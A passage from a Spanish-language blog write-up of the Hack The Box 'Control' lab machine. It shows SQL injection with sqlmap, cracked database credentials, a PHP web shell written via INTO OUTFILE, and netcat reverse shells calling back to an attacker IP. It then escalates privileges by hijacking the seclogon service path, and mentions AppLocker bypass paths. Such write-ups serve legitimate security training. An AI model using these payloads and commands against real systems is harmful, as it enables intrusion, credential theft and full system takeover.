<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -u <span style=color:#e6db74>&#34;http://10.10.10.167/view_product.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;productId=1&#34;</span> --dbs
</code></pre></div><p>Obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.</p>
<ul>
<li>Payload: <code>productId=1 UNION ALL SELECT &lt;query>-- -</code></li>
</ul>
<p><img loading=lazy src=/images/posts/htb-control/exploit_1.png alt="Inyección con sqlmap">
</p>
<p>Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -u <span style=color:#e6db74>&#34;http://10.10.10.167/view_product.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;productId=1&#34;</span> -D mysql -T user --passwords
</code></pre></div><p>Obteniendo así sus hashes.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_2.png alt="Hashes de usuarios de base de datos">
</p>
<p>A lo que posteriormente, una vez guardados se hizo uso de <code>john</code> para crackearlos.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_3.png alt="Crackeo con john">
</p>
<p>Adicional a ello, haciendo uso de <a href=https://crackstation.net/>CrackStation</a> se obtuvo la contraseña de un hash adicional del cuál no se obtuvo con <code>john</code>.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_4.png alt="Crackeo con CrackStation">
</p>
<p>Identificando así las credenciales:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>manager:l3tm3!n
hector:l33th4x0rhector
</code></pre></div><h2 id=rce>RCE<a hidden class=anchor aria-hidden=true href=#rce>#</a></h2>
<p>Después de obtener las credenciales y buscar emplearlas con los servicios expuestos en la máquina (mysql únicamente dado que no se cuenta con <code>smb</code> o algún otro servicio en donde se pudieran haber usado) <a href=https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/>se buscó la forma</a> para que mediante la inyección SQL se para pudiera lograr la ejecución remota de código mediante la escritura de un script en php, haciendo uso de instrucciones como <code>INTO OUTFILE</code> o <code>INTO DUMPFILE</code>.</p>
<p>Para lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al <a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">enlace encontrado</a> se indica que por predeterminado la ruta suele ser <code>c:\inetpub\wwwroot</code>, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.</p>
<p>Después de probar con diferentes payloads respecto al escape de las barras (<code>\</code>), dado que la respuesta del servidor es identificada como un <code>500 Internal Server Error</code>, se realizó una prueba de la escritura mediante:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i http://10.10.10.167/view_product.php -X POST -F <span style=color:#e6db74>&#34;productId=26 UNION ALL SELECT &#39;Hello world&#39; INTO OUTFILE &#39;c:\\\\\\\\inetpub\\\\wwwroot\\\\test.txt&#39;-- -&#34;</span>
</code></pre></div><p>Logrando escribir satisfactoriamente al archivo indicado.</p>
<p><em><strong>En este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.</strong></em></p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_5.png alt="Petición creación de archivo">
</p>
<p>Visualizandolo en el servidor.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_6.png alt="Visualización en navegador">
</p>
<p>Permitiendo de esta manera cambiar el payload a</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i http://10.10.10.167/view_product.php -X POST -F <span style=color:#e6db74>&#39;productId=26 UNION ALL SELECT &#34;&lt;?php system($_GET[\&#34;cmd\&#34;])?&gt;&#34; INTO OUTFILE &#34;c:\\\\\\\\inetpub\\\\wwwroot\\\\srrequiem.php&#34;-- -&#39;</span>
</code></pre></div><p>Logrando así tener un script listo para ejecutar comandos en la máquina.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_7.png alt=Webshell>
</p>
<p>Por lo que se estableció una reverse shell haciendo uso del binario <code>nc.exe</code>, subiéndolo a la máquina mediante la request:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\windows\temp\nc.exe
</code></pre></div><p>Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://10.10.10.167/srrequiem.php?cmd=c:\windows\temp\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234
</code></pre></div><p>Logrando así acceso de una manera más interactiva.</p>
<p><img loading=lazy src=/images/posts/htb-control/exploit_8.png alt="Reverse shell">
</p>
<h1 id=post-explotación>Post Explotación<a hidden class=anchor aria-hidden=true href=#post-explotación>#</a></h1>
<h2 id=enumeración-1>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración-1>#</a></h2>
<p>Al buscar atar cabos sueltos respecto a lo indicado en el código fuente del sitio, se pudo visualizar que en el contenido del script de <code>admin.php</code> se hace un filtrado de cabeceras indicado por <code>HTTP_X_FORWARDED_FOR</code> buscando la IP indicada <code>192.168.4.28</code>. A lo que por consiguiente si se añadiera la cabecera <code>X-Forwarded-For: 192.168.4.28</code> a las peticiones realizadas se visualizaría el contenido de <code>admin.php</code>, logrando así un bypass de la validación.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_14.png alt="Validación de cabeceras">
</p>
<h2 id=escalación-de-privilegios>Escalación de privilegios<a hidden class=anchor aria-hidden=true href=#escalación-de-privilegios>#</a></h2>
<h3 id=nt-authorityiusr-rarr-hector>nt authority\iusr → hector<a hidden class=anchor aria-hidden=true href=#nt-authorityiusr-rarr-hector>#</a></h3>
<p>Habiendo identificado que existe el usuario <code>hector</code> en el sistema operativo por medio del listado de directorios de <code>c:\users</code>, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_1.png alt="Listado de c:\users">
</p>
<p>Habiendo encontrado <a href=https://lazyadmin.nl/powershell/start-process/>esta</a> y <a href=https://davidhamann.de/2019/12/08/running-command-different-user-powershell/>esta</a> referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario <code>hector</code>.</p>
<p>Previamente identificando el nombre de la máquina y/o hostname con:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Cualquiera de los siguientes comandos</span>
hostname
$env:COMPUTERNAME
<span style=color:#66d9ef>[Environment]</span>::MachineName
</code></pre></div><p>Según lo indica <a href=https://adamtheautomator.com/powershell-get-computer-name/>este blog</a> para encontrar ese valor y usarlo posteriormente.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_2.png alt="Nombre de máquina">
</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$userName = <span style=color:#e6db74>&#39;fidelity\hector&#39;</span>
$userPassword = <span style=color:#e6db74>&#39;l33th4x0rhector&#39;</span>
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami }
</code></pre></div><p>Logrando así ejecución como el usuario <code>hector</code>.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_3.png alt="Ejecución de comandos como hector">
</p>
<p>Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de <code>netcat</code> previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver smbFolder <span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span> -smb2support
</code></pre></div><p>Y ejecutándolo con:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 4321 }
</code></pre></div><p>Obteniendo así una segunda revershell pero en esta ocasión como el usuario <code>hector</code>.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_4.png alt="Reverse shell como hector">
</p>
<h3 id=hector-rarr-nt-authoritysystem>hector → nt authority\system<a hidden class=anchor aria-hidden=true href=#hector-rarr-nt-authoritysystem>#</a></h3>
<p>Buscando obtener información relevante para escalar como administrador, se ejecutó <a href=https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS>winPEAS</a>, identificando que se cuenta con un gran número de registros a los cuales se tiene acceso completo.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_5.png alt="Lista de registros con acceso">
</p>
<p>Bajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuración de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificación e iniciar el servicio se obtendría acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realizó un filtrado de estos servicios bajo su perfil de ejecución y status para que a la hora de modificarlo se pudiera iniciar el servicio.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$services = Get-ItemProperty -Path HKLM<span style=color:#960050;background-color:#1e0010>:</span>\System\CurrentControlSet\Services\* <span style=color:#75715e># Para obtener todos los servicios</span>
$filtered_services = $services | where { ($_.ObjectName <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#39;LocalSystem&#39;</span>) <span style=color:#f92672>-And</span> ($_.Start <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#39;3&#39;</span>) } <span style=color:#75715e># Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente</span>
</code></pre></div><p>En este punto quedaría filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena <code>RP</code> según es especificado en <a href=https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/>este blog</a> en la propiedad de <code>Sddl</code> de los permisos desplegados de la lista actual de servicios.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_6.png alt="Propiedad sddl de lista de registros">
</p>
<p>Lo que individualmente por servicio es ubicado en la propiedad <code>Security</code>, en donde se encuentra en forma binaria.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_7.png alt="Propiedad security de registro">
</p>
<p>Trasladandolo a una lectura similar a la propiedad <code>sddl</code>, se puede ejecutar <code>cmd /c sc sdshow wuauserv</code> para visualizar el valor de mejor manera.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_8.png alt="Propiedad security convertida a sddl">
</p>
<p>Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>ConvertFrom-SDDLString -Sddl <span style=color:#e6db74>&#34;D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)&#34;</span>
</code></pre></div><p>Para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_9.png alt="Lectura de propiedad sddl">
</p>
<p>Por lo que se iteró en la lista previa de servicios la búsqueda de este permiso mediante el siguiente ciclo:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$services_names = $filtered_services.pschildname
<span style=color:#66d9ef>foreach</span> ($service <span style=color:#66d9ef>in</span> $services_names) {
    $sddl = (cmd /c sc sdshow $service)
    <span style=color:#66d9ef>if</span> ($sddl <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;RP[A-Z]*?;;;AU&#34;</span>) {
        $service
    }
}

<span style=color:#75715e># Iteración en una línea</span>
$canStartServices = <span style=color:#66d9ef>foreach</span> ($service <span style=color:#66d9ef>in</span> $services_names) {$sddl = (cmd /c sc sdshow $service); <span style=color:#66d9ef>if</span> ($sddl <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;RP[A-Z]*?;;;AU&#34;</span>) { $service }}
</code></pre></div><p>Dando como resultado la lista de los servicios buscados.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_10.png alt="Servicios filtrados">
</p>
<p>Obteniendo lo anterior se puede modificar la propiedad <code>ImagePath</code> del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.</p>
<h4 id=usando-powershell>Usando powershell<a hidden class=anchor aria-hidden=true href=#usando-powershell>#</a></h4>
<p>Mediante powershell habría que:</p>
<p><img loading=lazy src=/images/posts/htb-control/post_11.png alt="Valores de servicio a modificar">
</p>
<ol>
<li>
<p>Asegurar encontrarse en la ruta de los registros:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>cd HKLM<span style=color:#960050;background-color:#1e0010>:</span>\system\currentcontrolset\services
</code></pre></div></li>
<li>
<p>Obtener las propiedades del servicio requerido:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>get-item -path seclogon
</code></pre></div></li>
<li>
<p>Visualizar el valor a cambiar de <code>ImagePath</code></p>
</li>
</ol>
<p><img loading=lazy src=/images/posts/htb-control/post_12.png alt="Modificaciones de servicio">
</p>
<ol>
<li>
<p>Ejecutar (para modificar los valores con los deseados):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>set-itemproperty seclogon -name imagepath -value <span style=color:#e6db74>&#34;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&#34;</span>
</code></pre></div></li>
<li>
<p>Obtener las propiedades del servicio requerido <code>seclogon</code> para validar el cambio.</p>
</li>
<li>
<p>Visualizar el cambio realizado a <code>ImagePath</code>.</p>
</li>
</ol>
<p>El cual al montar la conexión de escucha, bastaría con iniciar el servicio con:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>start-service seclogon
</code></pre></div><p>Para así ejecutar el binario indicado.</p>
<p><img loading=lazy src=/images/posts/htb-control/post_13.png alt="Reverse shell como nt authority\system">
</p>
<h4 id=usando-cmd>Usando cmd<a hidden class=anchor aria-hidden=true href=#usando-cmd>#</a></h4>
<p>Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:</p>
<ol>
<li>
<p>Para visualizar los valores del servicio:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>reg query HKLM\system\currentcontrolset\services\seclogon
</code></pre></div></li>
<li>
<p>Para cambiar los valores de la propiedad <code>ImagePath</code> de acuerdo a lo encontrado en <a href=https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10>este blog</a> para realizar los cambios e identificar el tipo de dato a cambiar <code>REG_EXPAND_SZ</code> para efectuarlo correctamente:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>reg add HKLM\system\currentcontrolset\services\seclogon /v ImagePath /t REG_EXPAND_SZ /d <span style=color:#e6db74>&#34;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&#34;</span> /f
</code></pre></div></li>
<li>
<p>Para iniciar el servicio:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>sc start seclogon
</code></pre></div></li>
</ol>
<h1 id=notas-adicionales>Notas adicionales<a hidden class=anchor aria-hidden=true href=#notas-adicionales>#</a></h1>
<p>Mientras resolvía la máquina encontré diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la máquina o lo ejecutaba a través del cliente smb, logré solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalación de privilegios.</p>
<p>Dado que durante el proceso de resolución personalmente busco lo equivalente a comparar respuestas en una evaluación por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de <a href=https://0xdf.gitlab.io/>0xdf</a> e <a href=https://www.youtube.com/c/ippsec>IppSec</a>, noté que ambos hicieron referencia a <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker>AppLocker</a> ya que el mismo problema se presentó. Después de buscar más información al respecto, encontré que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en <a href=https://github.com/api0cradle/UltimateAppLockerByPassList>repositorios de github</a> dándole motivo al uso de la ruta <code>C:\Windows\System32\spool\drivers\color</code> que se emplea en los write-ups.</p>
<h1 id=referencias>Referencias<a hidden class=anchor aria-hidden=true href=#referencias>#</a></h1>
<ul>
<li><a href=https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html>SQL Injection</a>.</li>
<li><a href=https://crackstation.net/>CrackStation</a>.</li>
<li><a href=https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/>SQLI to RCE</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">How to: Find the Web Application Root</a>.</li>
<li><a href=https://lazyadmin.nl/powershell/start-process/>How to use Start Process in PowerShell</a>.</li>
<li><a href=https://davidhamann.de/2019/12/08/running-command-different-user-powershell/>Running commands in a specific user context in PowerShell</a>.</li>
<li><a href=https://stackoverflow.com/questions/60248354/powershell-jobs-vs-start-process>StackOverflow - PowerShell Jobs vs Start-Process</a>.</li>
<li><a href=https://adamtheautomator.com/powershell-get-computer-name/>Powershell get computer name</a>.</li>
<li><a href=https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10>How to edit the Registry using Command Prompt on Windows 10</a>.</li>
<li><a href=https://www.itprotoday.com/compute-engines/what-are-errorcontrol-start-and-type-values-under-services-subkeys>Significado del valor Start en registros</a>.</li>
<li><a href=https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/>Start Stop service rights to non administrators</a>.</li>
<li><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker>What is AppLocker?</a>.</li>
<li><a href=https://github.com/api0cradle/UltimateAppLockerByPassList>Ultimate AppLocker ByPass List</a>.</li>
</ul>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://srrequiem.xyz/tags/http/>http</a></li>
<li><a href=https://srrequiem.xyz/tags/sqli/>SQLi</a></li>
<li><a href=https://srrequiem.xyz/tags/sqlmap/>sqlmap</a></li>
<li><a href=https://srrequiem.xyz/tags/sqli-rce/>SQLi-RCE</a></li>
<li><a href=https://srrequiem.xyz/tags/x-forwarded-for/>X-Forwarded-For</a></li>
<li><a href=https://srrequiem.xyz/tags/invoke-command/>Invoke-Command</a></li>
<li><a href=https://srrequiem.xyz/tags/servicios-windows/>Servicios Windows</a></li>
<li><a href=https://srrequiem.xyz/tags/sddl/>sddl</a></li>
<li><a href=https://srrequiem.xyz/tags/registros-windows/>Registros Windows</a></li>
<li><a href=https://srrequiem.xyz/tags/reg/>reg</a></li>
<li><a href=https://srrequiem.xyz/tags/sc/>sc</a></li>
<li><a href=https://srrequiem.xyz/tags/applocker/>AppLocker</a></li>
<li><a href=https://srrequiem.xyz/tags/applocker-bypass/>AppLocker Bypass</a></li>
</ul>
<nav class=paginav>
<a class=prev href=https://srrequiem.xyz/posts/htb-devel/>
<span class=title>« Anterior</span>
<br>
<span>Hack The Box - Devel</span>
</a>
<a class=next href=https://srrequiem.xyz/posts/htb-remote/>
<span class=title>Siguiente »</span>
<br>
<span>Hack The Box - Remote</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Control&url=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f&hashtags=http%2cSQLi%2csqlmap%2cSQLi-RCE%2cX-Forwarded-For%2cInvoke-Command%2cServiciosWindows%2csddl%2cRegistrosWindows%2creg%2csc%2cAppLocker%2cAppLockerBypass"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f&title=Hack%20The%20Box%20-%20Control&summary=Hack%20The%20Box%20-%20Control&source=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f&title=Hack%20The%20Box%20-%20Control"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Control%20-%20https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 